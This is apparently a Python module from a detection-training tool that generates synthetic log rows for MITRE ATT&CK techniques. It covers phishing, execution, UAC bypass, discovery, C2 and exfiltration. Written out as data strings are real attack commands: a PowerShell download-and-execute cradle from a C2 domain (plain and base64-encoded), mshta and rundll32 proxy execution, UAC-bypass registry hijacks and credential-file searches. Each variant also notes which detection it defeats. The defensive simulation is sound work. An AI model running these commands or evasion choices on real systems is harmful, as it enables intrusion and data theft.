"""Coverage emitters — techniques the catalogue names and the kill chain
implies, but the first emitter pass didn't ship.

Each is written with the same rows.* builders and the same variant discipline
as the original 27: every technique offers two or three ways to perform itself,
and at least one variant is chosen to defeat the obvious query (call by ordinal
instead of export name, chunked transfers under a size threshold, an internal
relay hiding the C2 destination). Registering these lights them up in the
ATT&CK coverage map and makes them buildable and hunt-scorable like any other.

Grouped roughly along the kill chain: initial access, execution, privilege
escalation / defence evasion, discovery, command-and-control, exfiltration.
"""
from __future__ import annotations

import base64
from datetime import timedelta
from typing import Iterator

from .. import rows
from .base import EmitContext, Variant, loud_scale, register


def _enc(cmd: str) -> str:
    """Base64 of a UTF-16LE string — exactly what `-EncodedCommand` consumes."""
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def _public_ip(rng) -> str:
    return (f"{rng.choice([45, 91, 103, 185, 203, 194])}.{rng.randint(1, 254)}."
            f"{rng.randint(1, 254)}.{rng.randint(1, 254)}")


# ══ Initial access ════════════════════════════════════════════════════════

# ── T1566.002 Spearphishing Link ─────────────────────────────────────────

PHISH_LINK_VARIANTS = [
    Variant("credential_harvest", "Link to a fake login page",
            "Victim resolves and connects to a look-alike SSO domain from Outlook",
            "", weight=1.0),
    Variant("shortened_url", "Shortened / redirector link",
            "First hop is a URL-shortener; the real destination is only in the redirect",
            "defeats domain-blocklist matching on the final host", weight=0.9),
]


@register("T1566.002", PHISH_LINK_VARIANTS, tables=("DnsEvents", "DeviceNetworkEvents"))
def spearphishing_link(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.beachhead, intr.victim
    ts = plan.start
    lookalike = rng.choice([
        "harbourline-sso.com", "harbourline-secure.net", "office365-verify.com"])

    if plan.variant == "shortened_url":
        hop = rng.choice(["bit.ly", "tinyurl.com", "t.co"])
        yield from ctx.mark(rows.dns_event(ctx.gen, host, ts, name=hop),
                            "phishing redirector lookup")
        ts += timedelta(seconds=rng.randint(1, 4))

    yield from ctx.mark(rows.dns_event(
        ctx.gen, host, ts, name=lookalike, answers=intr.c2_ip), "phishing domain lookup")
    yield from ctx.mark(rows.device_network_event(
        ctx.gen, host, user, ts + timedelta(seconds=2), remote_ip=intr.c2_ip,
        remote_port=443, remote_url=lookalike, process="outlook.exe"),
        "victim clicked phishing link")


# ── T1133 External Remote Services ───────────────────────────────────────

EXT_REMOTE_VARIANTS = [
    Variant("rdp_external", "External RDP logon",
            "4624 LogonType 10 from a public source IP, no preceding failures",
            "", weight=1.0),
    Variant("valid_account_vpn", "VPN with a valid account",
            "A clean interactive logon from an unusual public IP — no brute force",
            "defeats failed-logon / brute-force detection", weight=0.9),
]


@register("T1133", EXT_REMOTE_VARIANTS, tables=("SecurityEvent", "DeviceLogonEvents"))
def external_remote_services(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host = intr.beachhead
    user = intr.current_user()
    src = _public_ip(rng)
    ts = plan.start
    for i in range(loud_scale(plan.loudness, 1, 4)):
        ts += timedelta(minutes=rng.randint(3, 40))
        yield from ctx.mark(rows.security_logon(
            ctx.gen, host, user, ts, logon_type=10, src_ip=src,
            auth_package="Negotiate", logon_process="User32"),
            "external remote logon")


# ── T1190 Exploit Public-Facing Application ──────────────────────────────

EXPLOIT_WEB_VARIANTS = [
    Variant("webshell", "Web shell command execution",
            "w3wp.exe as the parent of cmd.exe / powershell.exe on a web server",
            "", weight=1.0),
    Variant("in_process", "In-process, minimal children",
            "A single encoded powershell under w3wp — no cmd.exe, few children",
            "defeats noisy-web-shell heuristics", weight=0.9),
]


@register("T1190", EXPLOIT_WEB_VARIANTS, tables=("DeviceProcessEvents", "SecurityEvent"))
def exploit_public_facing(ctx: EmitContext) -> Iterator[dict]:
    rng, plan, org = ctx.rng, ctx.plan, ctx.org
    intr = ctx.intrusion
    server = rng.choice(org.servers) if org.servers else intr.current_host()
    intr.reach(server)
    user = intr.current_user()
    ts = plan.start

    if plan.variant == "webshell":
        cmds = [("cmd.exe", "cmd.exe /c whoami"),
                ("cmd.exe", "cmd.exe /c ipconfig /all"),
                ("net.exe", "net.exe user")]
        for img, cmd in cmds[:loud_scale(plan.loudness, 1, len(cmds))]:
            ts += timedelta(seconds=rng.randint(3, 30))
            yield from ctx.mark(rows.execution(
                ctx.gen, server, user, ts, img, cmd, parent="w3wp.exe",
                integrity="High"), "web shell command")
    else:
        cmd = f"powershell.exe -nop -w hidden -enc {_enc('whoami; hostname')}"
        yield from ctx.mark(rows.execution(
            ctx.gen, server, user, ts + timedelta(seconds=4), "powershell.exe",
            cmd, parent="w3wp.exe", integrity="High"), "in-process web exploit")


# ══ Execution ═════════════════════════════════════════════════════════════

# ── T1204.002 User Execution: Malicious File ─────────────────────────────

USER_EXEC_VARIANTS = [
    Variant("macro", "Office macro spawns a shell",
            "winword.exe / excel.exe as the parent of an encoded powershell",
            "", weight=1.0),
    Variant("lnk_file", "Malicious .lnk shortcut",
            "explorer.exe -> powershell — no Office parent at all",
            "defeats 'Office app spawned a shell' detection", weight=0.9),
    Variant("hta", "HTA via mshta.exe",
            "mshta.exe running a remote script — a LOLBIN, not an Office child",
            "defeats Office-parent and powershell detection", weight=0.8),
]


@register("T1204.002", USER_EXEC_VARIANTS, tables=("DeviceProcessEvents", "SecurityEvent"))
def user_execution(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.beachhead, intr.victim
    ts = plan.start + timedelta(seconds=rng.randint(2, 20))
    dl = f"IEX (New-Object Net.WebClient).DownloadString('http://{intr.c2_domain}/a')"

    if plan.variant == "macro":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "powershell.exe",
            f"powershell.exe -nop -w hidden -enc {_enc(dl)}",
            parent=rng.choice(["winword.exe", "excel.exe"])), "macro dropper")
    elif plan.variant == "lnk_file":
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "powershell.exe",
            f"powershell.exe -nop -c \"{dl}\"", parent="explorer.exe"),
            "lnk dropper")
    else:
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "mshta.exe",
            f"mshta.exe http://{intr.c2_domain}/a.hta", parent="explorer.exe"),
            "hta dropper")


# ── T1059.003 Windows Command Shell ──────────────────────────────────────

CMD_VARIANTS = [
    Variant("batch_chain", "Chained cmd.exe commands",
            "cmd.exe /c chaining several tools with &&",
            "", weight=1.0),
    Variant("for_loop", "for /f loop",
            "cmd.exe iterating with for /f over command output",
            "", weight=0.9),
    Variant("env_obfuscation", "Environment-variable obfuscation",
            "%comspec% and set-substitution hide the real command string",
            "defeats literal-string command matching", weight=0.8),
]


@register("T1059.003", CMD_VARIANTS, tables=("DeviceProcessEvents", "SecurityEvent"))
def windows_command_shell(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.start + timedelta(seconds=rng.randint(2, 20))

    if plan.variant == "batch_chain":
        cmd = "cmd.exe /c whoami && hostname && net user && ipconfig /all"
    elif plan.variant == "for_loop":
        cmd = 'cmd.exe /c for /f "tokens=*" %i in (hosts.txt) do @ping -n 1 %i'
    else:
        cmd = "%comspec% /c set x=who&&set y=ami&&call %x%%y%"
    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts, "cmd.exe", cmd, parent="explorer.exe"),
        "command-shell execution")


# ── T1059.007 JavaScript ─────────────────────────────────────────────────

JS_VARIANTS = [
    Variant("wscript_js", "wscript running a .js",
            "wscript.exe executing a .js file from a temp path",
            "", weight=1.0),
    Variant("mshta_vbscript", "mshta vbscript:",
            "mshta.exe with an inline vbscript: payload — no script file on disk",
            "defeats detections keyed on a script file path", weight=0.9),
    Variant("cscript_vbs", "cscript running a .vbs",
            "cscript.exe //nologo over a .vbs dropper",
            "", weight=0.8),
]


@register("T1059.007", JS_VARIANTS, tables=("DeviceProcessEvents", "SecurityEvent"))
def javascript_execution(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.start + timedelta(seconds=rng.randint(2, 20))
    d = intr.staging_dir

    if plan.variant == "wscript_js":
        img, cmd = "wscript.exe", rf"wscript.exe {d}\update.js"
    elif plan.variant == "mshta_vbscript":
        img, cmd = "mshta.exe", ('mshta.exe vbscript:Execute('
                                 '"CreateObject(""Wscript.Shell"").Run ""powershell""")')
    else:
        img, cmd = "cscript.exe", rf"cscript.exe //nologo {d}\run.vbs"
    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts, img, cmd, parent="explorer.exe"),
        "script-engine execution")


# ── T1218.011 System Binary Proxy Execution: Rundll32 ────────────────────

RUNDLL_VARIANTS = [
    Variant("js_protocol", "rundll32 javascript:",
            "rundll32.exe with a javascript: URL in the command line",
            "", weight=1.0),
    Variant("export_ordinal", "Call by ordinal",
            "rundll32.exe <dll>,#1 — the export is referenced by number, not name",
            "defeats detections keyed on a known export name", weight=0.9),
]


@register("T1218.011", RUNDLL_VARIANTS, tables=("DeviceProcessEvents", "SecurityEvent"))
def rundll32_proxy(ctx: EmitContext) -> Iterator[dict]:
    plan = ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.jitter(ctx.rng)

    if plan.variant == "js_protocol":
        cmd = ('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";'
               "eval(\"w=new ActiveXObject('WScript.Shell')\")")
    else:
        cmd = rf"rundll32.exe {intr.staging_dir}\update.dll,#1"
    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts, "rundll32.exe", cmd, parent="explorer.exe"),
        "rundll32 proxy execution")


# ── T1027 Obfuscated Files or Information ─────────────────────────────────

OBFUSCATION_VARIANTS = [
    Variant("base64_powershell", "Base64 -EncodedCommand",
            "powershell.exe -enc <blob> — collides with the benign dev's daily -enc use",
            "collides with the benign -EncodedCommand baseline", weight=1.0),
    Variant("certutil_decode", "certutil -decode",
            "certutil.exe -decode turns a text blob into a payload — no -enc at all",
            "defeats powershell -enc detection", weight=0.9),
    Variant("string_concat", "String concatenation / backticks",
            "powershell with 'i'+'ex' and back-ticks splitting keywords",
            "defeats keyword matching on iex / downloadstring", weight=0.8),
]


@register("T1027", OBFUSCATION_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent"))
def obfuscated_files(ctx: EmitContext) -> Iterator[dict]:
    plan = ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.jitter(ctx.rng)
    dl = f"IEX (New-Object Net.WebClient).DownloadString('http://{intr.c2_domain}/a')"

    if plan.variant == "base64_powershell":
        img, cmd = "powershell.exe", f"powershell.exe -nop -w hidden -enc {_enc(dl)}"
    elif plan.variant == "certutil_decode":
        img, cmd = ("certutil.exe",
                    rf"certutil.exe -decode {intr.staging_dir}\a.txt "
                    rf"{intr.staging_dir}\{intr.payload_name}")
    else:
        img, cmd = ("powershell.exe",
                    'powershell.exe -c "&(\'i\'+\'e\'+\'x\')(gc a.txt | Out-String)"')
    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts, img, cmd, parent="explorer.exe"),
        "obfuscated payload")


# ══ Privilege escalation & defence evasion ═════════════════════════════════

# ── T1068 Exploitation for Privilege Escalation ──────────────────────────

PRIVEXP_VARIANTS = [
    Variant("service_spawn", "Vulnerable service spawns an elevated shell",
            "spoolsv.exe / a service process as the parent of a High-integrity cmd.exe",
            "", weight=1.0),
    Variant("no_shell_parent", "Elevated process, no shell lineage",
            "A SYSTEM-integrity process appears with no matching user parent chain",
            "defeats parent-process lineage detection", weight=0.9),
]


@register("T1068", PRIVEXP_VARIANTS, tables=("DeviceProcessEvents", "SecurityEvent"))
def exploitation_privesc(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.jitter(ctx.rng)

    if plan.variant == "service_spawn":
        parent = rng.choice(["spoolsv.exe", "services.exe", "GoogleUpdate.exe"])
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, "cmd.exe", "cmd.exe /c whoami /priv",
            parent=parent, integrity="System"), "privilege escalation")
    else:
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts, intr.payload_name,
            rf"{intr.staging_dir}\{intr.payload_name}", parent="wininit.exe",
            integrity="System"), "elevated payload, no shell parent")


# ── T1548.002 Abuse Elevation Control: Bypass UAC ────────────────────────

UAC_VARIANTS = [
    Variant("fodhelper", "fodhelper.exe registry hijack",
            "A write under HKCU\\Software\\Classes\\ms-settings then fodhelper.exe runs elevated",
            "", weight=1.0),
    Variant("eventvwr", "eventvwr.exe mscfile hijack",
            "An HKCU\\Software\\Classes\\mscfile hijack, then eventvwr.exe",
            "defeats fodhelper-only detection", weight=0.9),
]


@register("T1548.002", UAC_VARIANTS,
          tables=("DeviceRegistryEvents", "DeviceProcessEvents", "SecurityEvent"))
def bypass_uac(ctx: EmitContext) -> Iterator[dict]:
    plan = ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.jitter(ctx.rng)

    if plan.variant == "fodhelper":
        key = r"HKCU\Software\Classes\ms-settings\Shell\Open\command"
        trigger = "fodhelper.exe"
    else:
        key = r"HKCU\Software\Classes\mscfile\shell\open\command"
        trigger = "eventvwr.exe"

    yield from ctx.mark(rows.device_registry_event(
        ctx.gen, host, user, ts, key=key, value_name="(Default)",
        value_data=rf"{intr.staging_dir}\{intr.payload_name}",
        action="RegistryValueSet", process="reg.exe"), "UAC-bypass hijack key")
    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts + timedelta(seconds=3), trigger, trigger,
        parent="explorer.exe", integrity="High"), "auto-elevated trigger")


# ══ Discovery ══════════════════════════════════════════════════════════════

# ── T1018 Remote System Discovery ────────────────────────────────────────

REMOTE_DISCOVERY_VARIANTS = [
    Variant("ping_sweep", "Ping sweep",
            "A burst of ping.exe against sequential hosts",
            "", weight=1.0),
    Variant("net_view", "net view / arp",
            "net view /domain and arp -a to enumerate reachable hosts",
            "", weight=1.0),
    Variant("nltest_dclist", "nltest /dclist",
            "A single nltest.exe listing domain controllers — no ping, no net.exe",
            "defeats ping-sweep and net.exe detection", weight=0.8),
]


@register("T1018", REMOTE_DISCOVERY_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent"))
def remote_system_discovery(ctx: EmitContext) -> Iterator[dict]:
    rng, plan, org = ctx.rng, ctx.plan, ctx.org
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.start

    if plan.variant == "ping_sweep":
        targets = rng.sample(org.devices, min(len(org.devices),
                                              loud_scale(plan.loudness, 4, 20)))
        for d in targets:
            ts += timedelta(seconds=rng.randint(1, 8))
            yield from ctx.mark(rows.execution(
                ctx.gen, host, user, ts, "ping.exe", f"ping.exe -n 1 {d.name}",
                parent="cmd.exe"), f"ping {d.name}")
    elif plan.variant == "net_view":
        for img, cmd in [("net.exe", "net view /domain"),
                         ("net.exe", "net view"),
                         ("arp.exe", "arp.exe -a")]:
            ts += timedelta(seconds=rng.randint(2, 20))
            yield from ctx.mark(rows.execution(
                ctx.gen, host, user, ts, img, cmd, parent="cmd.exe"),
                "remote system discovery")
    else:
        yield from ctx.mark(rows.execution(
            ctx.gen, host, user, ts + timedelta(seconds=3), "nltest.exe",
            f"nltest /dclist:{org.netbios.lower()}", parent="cmd.exe"),
            "dc list enumeration")


# ── T1482 Domain Trust Discovery ─────────────────────────────────────────

TRUST_VARIANTS = [
    Variant("nltest_trusts", "nltest /domain_trusts",
            "nltest.exe /domain_trusts enumerating trust relationships",
            "", weight=1.0),
    Variant("powershell_adtrust", "Get-ADTrust",
            "PowerShell AD cmdlets enumerating trusts — no nltest.exe",
            "defeats nltest.exe detection", weight=0.9),
]


@register("T1482", TRUST_VARIANTS, tables=("DeviceProcessEvents", "SecurityEvent"))
def domain_trust_discovery(ctx: EmitContext) -> Iterator[dict]:
    plan = ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.jitter(ctx.rng)

    if plan.variant == "nltest_trusts":
        img, cmd = "nltest.exe", "nltest /domain_trusts /all_trusts"
    else:
        img, cmd = ("powershell.exe",
                    'powershell.exe -Command "Get-ADTrust -Filter *"')
    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts, img, cmd, parent="cmd.exe"),
        "domain trust discovery")


# ── T1552.001 Unsecured Credentials: Credentials In Files ────────────────

CREDS_FILE_VARIANTS = [
    Variant("findstr_password", "findstr for 'password'",
            "findstr /spin password over user files and shares",
            "", weight=1.0),
    Variant("select_string", "PowerShell Select-String",
            "Select-String -Pattern password across shares — no findstr.exe",
            "defeats findstr.exe detection", weight=0.9),
    Variant("config_files", "Reading known credential files",
            "Access to unattend.xml / web.config / .aws\\credentials",
            "", weight=0.8),
]


@register("T1552.001", CREDS_FILE_VARIANTS,
          tables=("DeviceProcessEvents", "SecurityEvent"))
def credentials_in_files(ctx: EmitContext) -> Iterator[dict]:
    plan = ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.jitter(ctx.rng)

    if plan.variant == "findstr_password":
        img, cmd = "findstr.exe", r'findstr.exe /spin password C:\Users\*.txt C:\Users\*.xml'
    elif plan.variant == "select_string":
        img, cmd = ("powershell.exe",
                    'powershell.exe -Command "Get-ChildItem -Recurse | '
                    'Select-String -Pattern password"')
    else:
        img, cmd = "cmd.exe", r"cmd.exe /c type C:\Windows\Panther\unattend.xml"
    yield from ctx.mark(rows.execution(
        ctx.gen, host, user, ts, img, cmd, parent="cmd.exe"),
        "credentials-in-files search")


# ══ Command and control ════════════════════════════════════════════════════

# ── T1090 Proxy ──────────────────────────────────────────────────────────

PROXY_VARIANTS = [
    Variant("internal_relay", "Internal relay / pivot",
            "The beachhead's C2 traffic is routed via a second internal host",
            "defeats detections keyed on external destinations", weight=1.0),
    Variant("tor", "Tor entry node",
            "Connections to Tor node IPs on 9001 / 9030",
            "", weight=0.9),
]


@register("T1090", PROXY_VARIANTS,
          tables=("DeviceNetworkEvents", "CommonSecurityLog"))
def proxy(ctx: EmitContext) -> Iterator[dict]:
    rng, plan, org = ctx.rng, ctx.plan, ctx.org
    intr = ctx.intrusion
    host, user = intr.beachhead, intr.current_user()
    ts = plan.start
    n = loud_scale(plan.loudness, 8, 40)

    if plan.variant == "internal_relay":
        relay = rng.choice([d for d in org.devices if d != host] or org.devices)
        for i in range(n):
            ts += timedelta(seconds=rng.randint(20, 90))
            yield from ctx.mark(rows.device_network_event(
                ctx.gen, host, user, ts, remote_ip=relay.ip, remote_port=8080,
                remote_url=relay.name, process="svchost.exe"),
                f"pivot via {relay.name}")
    else:
        for i in range(n):
            ts += timedelta(seconds=rng.randint(15, 120))
            yield from ctx.mark(rows.device_network_event(
                ctx.gen, host, user, ts, remote_ip=_public_ip(rng),
                remote_port=rng.choice([9001, 9030]), process="tor.exe"),
                "tor circuit")


# ── T1573 Encrypted Channel ──────────────────────────────────────────────

ENC_CHANNEL_VARIANTS = [
    Variant("self_signed_tls", "Self-signed TLS to C2",
            "Repeated SSL sessions to one IP with no SNI / a self-signed certificate",
            "", weight=1.0),
    Variant("nonstandard_port", "TLS on a non-standard port",
            "Encrypted C2 on 8443 / 2087 instead of 443",
            "defeats port-443-only monitoring", weight=0.9),
]


@register("T1573", ENC_CHANNEL_VARIANTS,
          tables=("CommonSecurityLog", "DeviceNetworkEvents"))
def encrypted_channel(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.beachhead, intr.victim
    port = 443 if plan.variant == "self_signed_tls" else rng.choice([8443, 2087])
    ts = plan.start
    for i in range(loud_scale(plan.loudness, 10, 60)):
        ts += timedelta(seconds=rng.randint(30, 120))
        yield from ctx.mark(rows.device_network_event(
            ctx.gen, host, user, ts, remote_ip=intr.c2_ip, remote_port=port,
            remote_url=intr.c2_domain, process=rng.choice(["svchost.exe", "rundll32.exe"])),
            "encrypted C2 session")
        yield from ctx.mark(rows.firewall_event(
            ctx.gen, ts, src_ip=host.ip, dst_ip=intr.c2_ip, dst_port=port,
            action="allow", app="ssl", src_host=host.name,
            sent=rng.randint(300, 1800), received=rng.randint(300, 3000)),
            "encrypted C2 egress")


# ══ Exfiltration ═══════════════════════════════════════════════════════════

# ── T1041 Exfiltration Over C2 Channel ───────────────────────────────────

EXFIL_C2_VARIANTS = [
    Variant("bulk_over_c2", "Bulk upload over the C2 channel",
            "A large outbound transfer to the existing C2 IP — not a new destination",
            "defeats 'new external destination' detection", weight=1.0),
    Variant("trickle_over_c2", "Trickle exfil blended into beacons",
            "Slightly larger beacons carry data out over hours",
            "defeats single-large-transfer thresholds", weight=0.9),
]


@register("T1041", EXFIL_C2_VARIANTS,
          tables=("CommonSecurityLog", "DeviceNetworkEvents"))
def exfil_over_c2(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    ts = plan.start

    if plan.variant == "bulk_over_c2":
        total = rng.randint(150_000_000, 900_000_000)
        yield from ctx.mark(rows.firewall_event(
            ctx.gen, ts, src_ip=host.ip, dst_ip=intr.c2_ip, dst_port=443,
            action="allow", app="ssl", src_host=host.name,
            sent=total, received=rng.randint(1000, 8000)), "bulk exfil over C2")
        yield from ctx.mark(rows.device_network_event(
            ctx.gen, host, user, ts + timedelta(seconds=1), remote_ip=intr.c2_ip,
            remote_port=443, remote_url=intr.c2_domain, process="rundll32.exe"),
            "exfil connection")
    else:
        for i in range(loud_scale(plan.loudness, 10, 40)):
            ts += timedelta(minutes=rng.randint(2, 12))
            yield from ctx.mark(rows.firewall_event(
                ctx.gen, ts, src_ip=host.ip, dst_ip=intr.c2_ip, dst_port=443,
                action="allow", app="ssl", src_host=host.name,
                sent=rng.randint(200_000, 900_000), received=rng.randint(300, 2000)),
                f"trickle exfil beacon {i + 1}")


# ── T1030 Data Transfer Size Limits ──────────────────────────────────────

SIZE_LIMIT_VARIANTS = [
    Variant("fixed_chunks", "Fixed-size chunked transfer",
            "Many outbound transfers of an identical size, just under a round threshold",
            "defeats single-large-transfer thresholds", weight=1.0),
    Variant("randomized_chunks", "Randomised chunk sizes",
            "Chunk sizes vary to avoid an obvious fixed size",
            "defeats fixed-size-chunk detection", weight=0.9),
]


@register("T1030", SIZE_LIMIT_VARIANTS,
          tables=("CommonSecurityLog", "DeviceNetworkEvents"))
def data_transfer_size_limits(ctx: EmitContext) -> Iterator[dict]:
    rng, plan = ctx.rng, ctx.plan
    intr = ctx.intrusion
    host, user = intr.current_host(), intr.current_user()
    dst = rng.choice(["mega.nz", "transfer.sh", "anonfiles.com"])
    dst_ip = _public_ip(rng)
    ts = plan.start
    yield from ctx.mark(rows.dns_event(
        ctx.gen, host, ts, name=dst, answers=dst_ip), "exfil destination lookup")

    n = loud_scale(plan.loudness, 8, 40)
    for i in range(n):
        ts += timedelta(seconds=rng.randint(10, 60))
        if plan.variant == "fixed_chunks":
            size = 9_000_000            # just under a 10 MB alerting threshold
        else:
            size = rng.randint(4_000_000, 9_500_000)
        yield from ctx.mark(rows.firewall_event(
            ctx.gen, ts, src_ip=host.ip, dst_ip=dst_ip, dst_port=443,
            action="allow", app="ssl", src_host=host.name,
            sent=size, received=rng.randint(300, 2000)), f"size-limited chunk {i + 1}")
    yield from ctx.mark(rows.device_network_event(
        ctx.gen, host, user, ts, remote_ip=dst_ip, remote_port=443,
        remote_url=dst, process=rng.choice(["rclone.exe", "powershell.exe"])),
        "exfil connection")
